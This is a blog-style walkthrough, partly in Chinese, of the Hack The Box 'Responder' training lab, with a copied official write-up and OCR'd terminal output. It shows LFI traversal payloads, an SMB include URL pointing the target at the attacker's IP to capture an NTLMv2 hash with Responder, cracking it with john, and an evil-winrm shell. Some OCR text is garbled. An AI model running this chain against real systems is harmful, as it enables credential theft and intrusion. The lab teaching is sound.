<!DOCTYPE html><html lang="en">
	<!-- Power by astro.build, bulma.io and pages.cloudflare.com -->
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
		<link rel="stylesheet" href="/styles/global.css">
		<link rel="stylesheet" href="/styles/code_theme.css">
		<!-- <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script> -->
		<title>[Hack The Box] [Starting Point] [Tier 1] Responder | Versun</title>
		<link rel="icon" type="image/x-icon" href="/avatar.jpg">
	</head>
	<body>
			<nav class="tabs mb-4 has-background-warning">
    
    <ul>
        <li><a class="has-text-black navbar-item" href="/">Home</a></li>
    </ul>

</nav><section class="section">
    <div class="container content" id="post">
      <h2 class="subtitle">[Hack The Box] [Starting Point] [Tier 1] Responder</h2>
      <p><strong>TASK 1</strong></p>
<p><strong>When visiting the web service using the IP address, what is the domain that we are being redirected to?</strong> unika.htb</p>
<p><strong>TASK 2</strong></p>
<p><strong>Which scripting language is being used on the server to generate webpages?</strong> php</p>
<p><strong>TASK 3</strong></p>
<p><strong>What is the name of the URL parameter which is used to load different language versions of the webpage?</strong> page</p>
<p><strong>TASK 4</strong></p>
<p><strong>Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, ”../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”?</strong> ../../../../../../../../windows/system32/drivers/etc/hosts</p>
<p><strong>TASK 5</strong></p>
<p><strong>Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, ”../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”?</strong> //10.10.14.6/somefile</p>
<p><strong>TASK 6</strong></p>
<p><strong>What does NTLM stand for?</strong> New Technology Lan Manager</p>
<p><strong>TASK 7</strong></p>
<p><strong>Which flag do we use in the Responder utility to specify the network interface?</strong> -I</p>
<p><strong>TASK 8</strong></p>
<p><strong>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?</strong> John The Ripper</p>
<p><strong>TASK 9</strong></p>
<p><strong>What is the password for the administrator user?</strong> badminton</p>
<p><strong>TASK 10</strong></p>
<p><strong>We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</strong> 5985</p>
<p><strong>SUBMIT FLAG</strong></p>
<p>Steps:</p>
<p>edit /etc/hosts:</p>
<p><code>target-ip  unika.htb</code></p>
<p>尝试LFI(Local File Inclusion)，爆出具体的路径</p>
<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/88538f07-e81a-409c-a293-fe36ae44e07a.png" alt=""> <sup><a href="#user-content-fn-1" id="user-content-fnref-1" data-footnote-ref="" aria-describedby="footnote-label">1</a></sup></p>
<p>验证下路径是否正确，查看hosts文件</p>
<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/7c4d5417-7768-45a0-93e6-ea421327738e.png" alt=""> <sup><a href="#user-content-fn-2" id="user-content-fnref-2" data-footnote-ref="" aria-describedby="footnote-label">2</a></sup></p>
<p>使用responder来监听: <code>sudo responder -I tun0</code></p>
<p>然后访问 <a href="http://unika.htb/?page=//%5C%5BYour_tun0_IP%5C%5D/anything">http://unika.htb/?page=//\[Your_tun0_IP\]/anything</a></p>
<p>就会获取到hash</p>
<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9ab430bd-0840-42a7-9a12-200212f5935d.png" alt=""> <sup><a href="#user-content-fn-3" id="user-content-fnref-3" data-footnote-ref="" aria-describedby="footnote-label">3</a></sup></p>
<p>把hash保存下来，<code>echo "Admin....." >hash.txt</code></p>
<p>使用john来破解，<code>john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt</code></p>
<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/ac2f1a3d-1bce-4d95-9035-24990276422c.png" alt=""> <sup><a href="#user-content-fn-4" id="user-content-fnref-4" data-footnote-ref="" aria-describedby="footnote-label">4</a></sup></p>
<p>接下来开始用nmap扫描，注意该lab有速度检测，建议使用T4速度：</p>
<p>虽然没有扫描出winRM端口，但通过Task 10，谷歌下可以知道说的是winRM，默认端口就是5985</p>
<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9fff90d4-11d7-44b4-993d-b5bc2cf4e614.png" alt=""> <sup><a href="#user-content-fn-5" id="user-content-fnref-5" data-footnote-ref="" aria-describedby="footnote-label">5</a></sup></p>
<p>之后使用evil-winrm工具，即可获取到powershell</p>
<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/0265865a-662f-47ec-a065-aad699bbaebd.png" alt=""> <sup><a href="#user-content-fn-6" id="user-content-fnref-6" data-footnote-ref="" aria-describedby="footnote-label">6</a></sup></p>
<p>之后去Users\mike\Desktop文件夹下面，得到flag</p>
<hr>
<h3 id="note"><strong>Note:</strong></h3>
<p><a href="/attachments/Responder.pdf">Responder.pdf</a> <sup><a href="#user-content-fn-7" id="user-content-fnref-7" data-footnote-ref="" aria-describedby="footnote-label">7</a></sup></p>
<p>Ref:</p>
<p><a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt">Auto_Wordlists/file_inclusion_windows.txt at main · carlospolop/Auto_Wordlists (github.com)</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">Windows 远程管理 - Win32 apps | Microsoft Docs</a></p>
<p><a href="https://morgansimonsen.com/2009/12/10/winrm-and-tcp-ports/#:~:text=WinRM%2C%20or%20Windows%20Remote%20Management%2C%20is%20an%20HTTP,listens%20for%20local%20requests%20on%20TCP%20port%2047001.">Windows远程管理的安装和配置 - Win32 apps | Microsoft Docs</a></p>
<p><a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT LAN Manager - Wikipedia</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview">NTLM Overview | Microsoft Docs</a></p>
<p><a href="https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/">NTLM Explained: Definition, Protocols &#x26; More | CrowdStrike</a></p>
<p>Tools: nmap, responder, john, evil-winrm</p>
<p>Q: 什么是 Windows Remote Management (WinRM)</p>
<p>WinRM，即Windows远程管理，是一个基于HTTP的Windows远程管理和shell协议。</p>
<p>该协议是基于简单对象访问协议 (SOAP) 的、防火墙友好的标准协议，使来自不同供应商的硬件和操作系统能够互操作</p>
<p>如果WinRM没有被配置为远程访问，但该服务被启动，它就会在TCP 47001端口监听本地请求。</p>
<p>如果配置了监听器，它仍将监听47001，但也监听默认的TCP端口5985（HTTP）和5986（HTTPS）。</p>
<p>Q: 什么是Windows New Technology LAN Manager (NTLM) <sup><a href="#user-content-fn-8" id="user-content-fnref-8" data-footnote-ref="" aria-describedby="footnote-label">8</a></sup></p>
<p>是微软开发的一种用于用户认证的协议，它是一种single sign on (SSO)认证工具</p>
<p>Windows 2000以后，默认被Kerberos协议代替。</p>
<section data-footnotes="" class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-1">
<p>C
O &#x26; unika.htb/index.php?page=./././././
LD
S
Warning: include(C:\): Failed to open stream: No such file or directory in C:\xampp\htdocs\index.php on line 11
Warning: include(): Failed opening ’../../../../../’ for inclusion (include_path=‘\xampp\php\PEAR’) in C:\xampp\htdocs
index.php on line 11 <a href="#user-content-fnref-1" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-2">
<p>C
O &#x26; unika.htb/index.php?page=../../../windows/system32/drivers/etc/hosts
S
E</p>
<h1 id="copyright-c-1993-2009-microsoft-corp---this-is-a-sample-hosts-file-used-by-microsoft-tcpip-for-windows">Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. #</h1>
<p>This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP
address should # be placed in the first column followed by the corresponding host name. # The IP address and the host
name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on
individual # lines or following the machine name denoted by a ’#’ symbol. # # For example: # # 102.54.94.97
rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled
within DNS itself. # 127.0.0.1 localhost # ::1 localhost <a href="#user-content-fnref-2" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-3">
<p>C
O &#x26; unika.htb/index.php?page=//10.10.14.34/shares
UD
S
Warning: include(\\10.10.14.34\SHARES): Failed to open stream: Permission denied in C:\xampp\htdocs\index.php or
line 11
Warning: include(): Failed opening ‘//10.10.14.34/shares’ for inclusion (include_path=‘\xampp\php\PEAR’) in C:\xampp
htdocs\index.php on line 11
<a href="mailto:htb-versunpan@htb-coxgffsmhw.htb-cloud.com">htb-versunpan@htb-coxgffsmhw.htb-cloud.com</a>
X
[+] Current Session Variables:
Responder Machine Name
[WIN-OAN4YNLCUAM]
Responder Domain Name
[3RT5 . LOCAL]
Responder DCE-RPC Port
[48527]
[! ] Error starting TCP server on port 80, check permissions or other servers run
ning.
[+] Listening for events. .
[10 . 10 . 14.34
[SMB] NTLMv2-SSP Client
: 10 . 129 . 187 . 151
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMV2-SSP Hash
: Administrator : : RESPONDER : 0b0e59ed9a602248 : FB9B8BA7CF
C7B8ED75ABASAD3DDE53B9 : 0101000000000000809963F606C40801630EBE0912FF2EFF000000000
2000800330052005400350001001E00570049004E002D00300041004E00340059004E004CO0 43005
50041004D0004003400570049004E002D00300041004E00340059004E004CO04300550041004D002
E0033005200540035002E004C004F00430041004C000300140033005200540035002E004C004F004
30041004C000500140033005200540035002E004C004F00430041004C0007000800809963F606C4D
8010600040002000000080030003000000000000000010000000020000062EOF11DB7740702C7B22
EB127B6BF74105AD09E0272DE19410CFAF9DEOD1BOOOAO0100000000000000000000000000000000
0000900200063006900660073002F00310030002E00310030002E00310034002E003300340000000
00000000000 <a href="#user-content-fnref-3" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-4">
<p>[us- starting-point-vip-1-dhcp]-[10. 10. 14.34]-[htb- versunpan@pwnbox-base]-[~]
[*]$ john - -wordlist=/usr/share/wordlists/rockyou. txt hash. txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMV2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press ‘q’ or Ctri-C to abort, almost any other key for status
(Administrator)
1g 0:00:00:00 DONE (2022-09-09 06:44) 50.00g/s 204800p/s 204800c/s 204800C/s sli
mshady . . oooooo
Use the ”- -show - -format=netntlmv2” options to display all of the cracked passwo
rds reliably
Session completed
[us-starting-point- vip-1-dhcp]-[10. 10. 14.34]-[htb- versunpan@pwnbox-base]-[~]
[*] $ <a href="#user-content-fnref-4" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-5">
<ul>
<li>[*]$ nmap -p- -T5 -sV $ip
Starting Nmap 7.92 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2022-09-09 07:52 BST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.10 seconds
[us-starting-point- vip-1-dhcp]-[10. 10. 14.34]-[htb-versunpan@pwnbox-base]-[/roo
[*]$ nmap -p- -T4 -sV $ip
Starting Nmap 7.92 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2022-09-09 07:52 BST
Stats: 0:04:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 41.45% done; ETC: 08:02 (0:05:45 remaining)
Nmap scan report for 10. 129.212.201
Host is up (0.25s latency) .
Not shown: 65534 filtered tcp ports (no- response)
PORT
STATE SERVICE VERSION
80/tcp open http
Apache httpd 2.4.52 ((Win64) OpenSSL/1.1. 1m PHP/8. 1.1)
Service detection performed. Please report any incorrect results at https: //nmap
org/submit/
Nmap done: 1 IP address (1 host up) scanned in 510.35 seconds</li>
</ul>
<a href="#user-content-fnref-5" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a>
</li>
<li id="user-content-fn-6">
<p>[*]$ evil-winrm -i 10. 129.212.201 -u administrator -P 5985 -p badminton
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting
ection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: <a href="https://github">https://github</a>. com/Hackp
ers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C: \Users\Administrator\Documents> ls <a href="#user-content-fnref-6" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-7">
<p>Responder Write-up
Prepared by: dotguy
Introduction
Windows is the most predominant operating system in today’s world because of its easy-to-use GUI
accessibility. About 85% of the market share has become a critical OS to attack. Furthermore, most
organizations use Active Directory to set up their Windows domain networks. Microsoft employs NTLM
(New Technology LAN Manager) &#x26; Kerberos for authentication services. Despite known vulnerabilities,
NTLM remains widely deployed even on new systems to maintain compatibility with legacy clients and
servers.
This lab focuses on how a File Inclusion vulnerability on a webpage being served on a windows machine can
be exploited to collect the NetNTLMv2 challenge of the user that is running the web server. We will use a
utility called Responder to capture a NetNTLMv2 hash and later use a utility known as john the ripper
to test millions of potential passwords to see if they match the one used to create the hash. We will also be
taking a deeper look at the working process of NTLM authentication and how the Responder utility captures
the challenge. We believe that it’s crucial to understand the under the hood workings of a tool or a
framework as it strengthens the foundation of one’s understanding, which aids in the real world exploit
scenarios that one might face, which do not appear to be vulnerable at the first look. Let’s dive straight into
it.
Enumeration
We will begin by scanning the host for any open ports and running services with a Nmap scan. We will be
using the following flags for the scan:
-p- : This flag scans for all TCP ports ranging from 0-65535
-SV : Attempts to determine the version of the service running on a port
—min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher
nmap -p- —min-rate 5000 -sV 10.129.136.91
nmap -p-
—min-rate 5000 -sV 10. 129. 136.91
PORT
STATE
SERVICE
VERSION
80/tcp
oper
http
Apache httpd 2.4.52 ((Win64) OpenSSL/1. 1. 1m PHP/8. 1.1)
5040/tcp filtered unknown
5985/tcp open
http
Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
How does Nmap determine the service running on the port?
Nmap uses a port-services database of well-known services in order to determine the service
running on a particular port. It later also sends some service-specific requests to that port to
determine the service version &#x26; any additional information about it.
Thus, Nmap is mostly but not always correct about the service info for a particular port.
According to the results of the Nmap scan, the machine is using Windows as its operating system. Two ports
were detected as open having Apache web server running on port 80 along with WinRM on port 5985 .
Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol
that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as
Operating Systems and applications. WinRM allows the user to :</p>
<ul>
<li>Remotely communicate and interface with hosts</li>
<li>Execute commands remotely on systems that are not local to you but are network accessible.
Monitor, manage and configure servers, operating systems and client machines from a remote location.
As a pentester, this means that if we can find credentials (typically username and password) for a user who
has remote management privileges, we can potentially get a PowerShell shell on the host.
Website Enumeration
On opening Firefox and putting http://[target ip] , the browser returns a message about being unable
to find that site. Looking in the URL bar, it now shows <a href="http://unika.htb">http://unika.htb</a>. The website has redirected the
browser to a new URL, and your host doesn’t know how to find unika.htb. This webserver is employing
name-based Virtual Hosting for serving the requests.
Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of
each name) on a single server. This allows one server to share its resources, such as memory and processor
cycles, without requiring all the services to be used by the same hostname.
The web server checks the domain name provided in the Host header field of the HTTP request and sends
a response according to that.
The /etc/hosts file is used to resolve a hostname into an IP address &#x26; thus we will need to add an entry in
the /etc/hosts file for this domain to enable the browser to resolve the address for unika. htb.
Entry in the /etc/hosts file :
echo “10. 129. 136.91
unika . htb” | sudo tee -a /etc/hosts
Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika. htb to
the corresponding IP address &#x26; thus make the browser include the HTTP header Host: unika.htb in
every HTTP request that the browser sends to this IP address, which will make the server respond with the
webpage for unika.htb.
On accessing the web page we are presented with a web designing business landing page.
XUNIXA
HOME ABOUT SERVICES WORKS PRICES
CONTACT EN
LOOKING FOR NEW DESIGNS?
We’re here to help! Check out our services!
View More!
Checking the site out, we see nothing of particular interest. Although, we notice a language selection option
on the navbar EN and changing the option to FR takes us to a French version of the website.
/ unika htb/index.php?page=french.html
Getting Started @ Start Parrot OS @ Community @ Docs @ Git @ CryptPad | Privacy Pentest Learn Donations and Gadgets
XUNIXA
MAISON
SUR PRESTATIONS DE SERVICE NOTRE TRAVAIL
DESPRIX CONTACT FR
JE SUIS UNIKA
Avec mon equipe, tout est possible !
Voir plus!
Noticing the URL, we can see that the french. html page is being loaded by the page parameter, which
may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.
File Inclusion Vulnerability
Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
and POST parameters, cookies, and other variables. It is common for a page to “include” another page
based on some of these parameters.
LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
intended to be an option for this application. A common example is when an application uses the path to a
file as input. If the application treats this input as trusted, and the required sanitary checks are not
performed on this input, then the attacker can exploit it by using the . ./ string in the inputted file name
and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
execution as well.
RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
file on the host using protocols like HTTP, FTP etc.
We test the page parameter to see if we can include files on the target system in the server response. We
will test with some commonly known files that will have the same name across networks, Windows
domains, and systems which can be found here. One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,
WINDOWS\ System32\drivers\etc\hosts (this file aids in the local translation of host names to IP
addresses). The . ./ string is used to traverse back a directory, one at a time. Thus multiple . ./ strings are
included in the URL so that the file handler on the server traverses back to the base directory i.e. c:\.
<a href="http://unika.htb/index">http://unika.htb/index</a>. php?
page=. ./. ./../../../../../. ./windows/system32/drivers/etc/hosts
/ unika.htb/index.php?page=.J../.J././././windows/system32/drivers/c .+.@
Getting Started @ Start Parrot OS @ Community @ Docs @ Git @ CryptPad | Privacy
Learn Donations and Gadgets</li>
</ul>
<h1 id="copyright-c-1993-2009-microsoft-corp---this-is-a-sample-hosts-file-used-by-microsoft-tcpip-for-windows---this-file-contains-the">Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the</h1>
<p>mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column
followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally,
comments (such as these) may be inserted on individual # lines or following the machine name denoted by a ’#” symbol. # # For example: # #
102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. #
127.0.0.1 localhost # ::1 localhost
Great, LFI is possible as we can view the contents of the C: \windows\system32\drivers\etc\hosts file in
the response.
The file inclusion, in this case, was made possible because in the backend the include( ) method of PHP is
being used to process the URL parameter page for serving a different webpage for different languages.
And because no proper sanitization is being done on this page parameter, we were able to pass malicious
input and therefore view the internal system files.
What is the include() method in PHP?
The include statement takes all the text/code/markup that exists in the specified file and loads it into the
memory, making it available for use.
For example:
File 1 —> vars . php</p>
<!--?php
$color = 'green';
$fruit = 'apple' ;
File 2 ----> test. php
<!--?php
echo "A $color $fruit"; / / output = "A"
include 'vars.php' ;
echo "A $color $fruit"; // output = "A green apple"
?-->
<p>A more detailed explanation about the include( ) method of PHP can be found here.
Responder Challenge Capture
We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a
Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select
a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
What is NTLM (New Technology Lan Manager)?
NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :</p>
<ol>
<li>The client sends the user name and domain name to the server.</li>
<li>The server generates a random character string, referred to as the challenge.</li>
<li>The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.</li>
<li>The server retrieves the user password (or equivilent).</li>
<li>The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.
A more detailed explanation of the working of NTLM authentication can be found here.
NTLM vs NTHash vs NetNTMLv2
The terminology around NTLM authentication is messy, and even pros misuse it from time to time, so let’s
get some key terms defined:
. A hash function is a one way function that takes any amount of data and returns a fixed size value.
Typically, the result is referred to as a hash, digest, or fingerprint. They are used for storing passwords
more securely, as there’s no way to convert the hash directly back to the original data (though there
are attacks to attempt to recover passwords from hashes, as we’ll see later). So a server can store a
hash of your password, and when you submit your password to the site, it hashes your input, and
compares the result to the hash in the database, and if they match, it knows you supplied the correct
password.
An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
NTLM, which is very misleading / confusing.
. When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it’s not actually
a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You’ll see
NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.
Using Responder
In the PHP configuration file php. ini, “allow_url_include” wrapper is set to “Off” by default, indicating that
PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if
allow_url_include and allow_url_fopen are set to “Off”, PHP will not prevent the loading of SMB URLs.
In our case, we can misuse this functionality to steal the NTLM hash.
Now, using the example from this link we can attempt to load a SMB URL, and in that process, we can
capture the hashes from the target using Responder.
How does Responder work?
Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB
server. When the target machine attempts to perform the NTLM authentication to that server, Responder
sends a challenge back for the server to encrypt with the user’s password. When the server responds,
Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can’t
reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same
challenge-response, and if we find one, we know that is the password. This is often referred to as hash
cracking, which we’ll do with a program called John The Ripper.
To start with, if the Responder utility is not already installed on the machine, we clone the Responder
repository to our local machine.
git clone <a href="https://github.com/1gandx/Responder">https://github.com/1gandx/Responder</a>
Verify that the Responder . conf is set to listen for SMB requests.
cat Responder . conf
[ Responder Core]
; Server to start
SQL = On
SMB = On
<snip>
</snip></li>
</ol>
<p>With the configuration file ready, we can proceed to start Responder with python3 , passing in the interface
to listen on using the -I flag:
sudo python3 Responder . py -I tuno
The network interface can be checked by running the ifconfig command in the terminal.
In the case of Kali Linux or the HTB Pawnbox, Responder is installed by default as a system utility, thus it can
be launched just by running the command sudo responder -I {network_interface}
In case, an error is raised regarding not being able to start TCP server on port 80 , it is because port 80 is
already being used by another service on the machine. This error can be circumvented by altering the
Responder . conf file to toggle off the “HTTP” entry which is listed under the “Servers to start” section.
Location of Responder. conf file -
-> for default system install : /usr/share/responder/Responder . conf
-> for github installation
: /installation_directory/Responder . conf
Setting the “HTTP” flag to “Off” under the “Servers to start” section in the Responder . conf file :
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
[ * * SNIP * * ]
sudo python Responder . py -I tune
NBT-NS, LLMNR &#x26; MDNS Responder 2.3
Author: Laurent Gaffie ( laurent . gaffie@gmail. com)
To kill this script hit CTRL-C
[+] Poisoners :
LLMNR
[ ON ]
NBT-NS
[ON]
DNS/MDNS
[ ON]
[+] Servers :
HTTP server
[ ON]
HTTPS server
ON ]
WPAD proxy
[OFF ]
SMB server
[ ON ]
<snip>
[+] Listening for events. ..
With the Responder server ready, we tell the server to include a resource from our SMB server by setting
the page parameter as follows via the web browser.
<a href="http://unika.htb/?page=//10">http://unika.htb/?page=//10</a>. 10.14.25/somefile
In this case, because we have the freedom to specify the address for the SMB share, we specify the IP
address of our attacking machine. Now the server tries to load the resource from our SMB server, and
Responder captures enough of that to get the NetNTLMv2.
Note: Make sure to add http:// in the address as some browsers might opt for a Google search instead of
navigating to the appropriate page.
After sending our payload through the web browser we get an error about not being able to load the
requested file.
/ unika.htb/7page=//10.10.14.25/whatever
Getting Started @ Start Parrot OS @ Community @ Docs @ Git @ CryptPad Privacy Pentest Learn | Donations and Gadgets
Warning: include(\10.10.14.25\WHATEVER): Failed to open stream: Permission denied in Coxampp\htdocs\index.php on line 11
Warning: include(): Failed opening //10.10.14.25/whatever’ for inclusion (include_path=‘\xampp\php\PEAR’) in C:\xampp\htdocs\index.php on line
11
But on checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.
[+] Listening for events…
[ SMB ] NTMLV2-SSP Client
: 10. 129. 136.91
[SMB ] NTMLV2-SSP Username
: DESKTOP-H30F232\ADdministrator
SMB ] NTMLV2-SSP Hash
: Administrator : : DESKTOP-
H30F232 : 1122334455667788 : 70A87A2CCB487 AD9B76C7BOAEAEE133 : 0101000000000
000005F32148534D801FOE8BB688484(96C0000000002000800420044004F0032000100
LE00570049004E002D004E0048004500380044004900340041005300430051000400340
0570049004E002D004E0048004500380044004900340041005300430051002E00420044
004F0032002004C004F00430041004C0003001400420044004F0032002E004C004F004
30041004C0005001400420044004F0032002004C004F00430041004C0007000800005F
321485340801060004000200000008003000300000000000000001000000002000000C2
FAF941D04DCECC6A7691EA92630A77073056DA8C3F356D47C324C6D6D16FOA00100000
0000000000000000010900000000000900200063006900660073002F00310030002E003
100300020031003400200320035000000000000000000
The NetNTLMv2 includes both the challenge (random text) and the encrypted response.
Hash Cracking
We can dump the hash into a file and attempt to crack it with john, which is a password hash cracking
utility.
echo “Administrator: : DESKTOP-
H3OF232 : 1122334455667788 : 750A87A2CCB487AD9B76C7BOAEAEE133 : 0101000000000000005F3214B534D
801FOE8BB688484C9600000000002000800420044004F00320001001E00570049004E002D004E0048004500
3800440049003400410053004300510004003400570049004002D00400480045003800440049003400410
0530043005100200420044004F0032002004C004F004300410040003001400420044004F0032002E004C
004F004300410040005001400420044004F0032002004C004F004300410040007000800005F3214B534D
8010600040002000000080030003000000000000000010000000020000 00C2FAF941D04DCECC6A7691EA926
30A776073056DA8C3F356D47C324CD6D16F0A0010000000000000000000000000000000000009002000630
06900660073002F003100300020031003000200310034002E00320035000000000000000000” >
hash . txt
We pass the hash file to john and crack the password for the Administrator account. The hash type is
automatically identified by the john command-line tool.
-w : wordlist to use for cracking the hash
john -w=/usr/share/wordlists/rockyou. txt hash. txt
john -w=/usr/share/wordlists/rockyou. txt hash. txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntinv2, NTLMV2 C/R [D4 HAC-MD5 32/641)
Will run 2 OpenP threads
Press ‘q’ or Ctri-C to abort, almost any other key for status
badminton ( Administrator )
1g 0:00:00:00 DONE (2922-03-10 19:32) 100.8g/s 499680p/s 489688c/s 409689C/s adriano. . 060090
Use the show —format-bettlev2” options to display all of the cracked passwords reliably
Session completed
john will try each password from the given password list, encrypting the challenge with that password. If
the result matches the response, then it knows it found the correct password. In this case, the password of
the Administrator account has been successfully cracked.
password : badminton
WinRM
We’ll connect to the WinRM service on the target and try to get a session. Because PowerShell isn’t installed
on Linux by default, we’ll use a tool called Evil-WinRM which is made for this kind of scenario.
evil-winrm -i 10.129. 136.91 -u administrator -p badminton
evil-winrm -i 10. 129. 136.91 -u administrator -p badminton
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C: \Users\Administrator\Documents>
We can find the flag under c: \Users\mike\Desktop\flag. txt.
O
*Evil-WinRM* PS C: \Users\mike\Desktop> dir
Directory: C: \users\mike\desktop
Mode
LastWriteTime
Length Name
-a----
3/10/2022
4:50 AM
32
flag. txt
Congratulations! You can now use the type command to view the contents of the flag. txt. <a href="#user-content-fnref-7" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></snip></p>
</li>
<li id="user-content-fn-8">
<p>Windows New Technology LAN Manager (NTLM)</p>
<h2 id="what-is-ntlm-used-for"><strong>What Is NTLM Used For?</strong></h2>
<p><strong>Windows New Technology LAN Manager (NTLM)</strong> is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a <strong>single sign on (SSO)</strong> tool that relies on <strong>a challenge-response protocol</strong> to confirm the user without requiring them to submit a password.</p>
<p>Despite known vulnerabilities, NTLM remains widely deployed even on new systems in order to maintain compatibility with legacy clients and servers. While NTLM is still supported by Microsoft, it has been replaced by Kerberos as the default authentication protocol in Windows 2000 and subsequent Active Directory (AD) domains.</p>
<h2 id="how-does-the-ntlm-protocol-work"><strong>How Does the NTLM Protocol Work?</strong></h2>
<p>NTLM authenticates users through <strong>a challenge-response mechanism</strong>. This process consists of three messages:</p>
<p><strong>Negotiation message</strong> from the client</p>
<p><strong>Challenge message</strong> from the server</p>
<p><strong>Authentication message</strong> from the client</p>
<h3 id="ntlm-authentication-process"><strong>NTLM Authentication Process</strong></h3>
